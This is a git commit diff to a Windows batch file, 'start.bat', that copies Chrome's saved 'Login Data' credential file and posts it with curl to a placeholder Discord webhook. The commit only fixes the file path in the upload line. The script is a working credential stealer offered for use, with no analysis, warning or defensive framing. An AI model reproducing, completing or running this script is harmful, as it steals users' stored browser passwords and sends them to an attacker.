4ab47108dc4e69a7285b589d8239d85b3d953106
BlackdestinyXX <65021823+BlackdestinyXX@users.noreply.github.com>
2021-06-30 09:50:12 +0200

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,2 +1,2 @@
 COPY "%localappdata%\Google\Chrome\User Data\Default\Login Data" "grabbed/data.txt"
-curl -i -H "Accept: multipart/form-data" -H "Content-Type: multipart/form-data" -X POST -F "file2=@bella_raga/data.txt" YOUR_DISCORD_WEBHOOK_LINK
+curl -i -H "Accept: multipart/form-data" -H "Content-Type: multipart/form-data" -X POST -F "file1=@grabbed/data.txt" YOUR_DISCORD_WEBHOOK_LINK
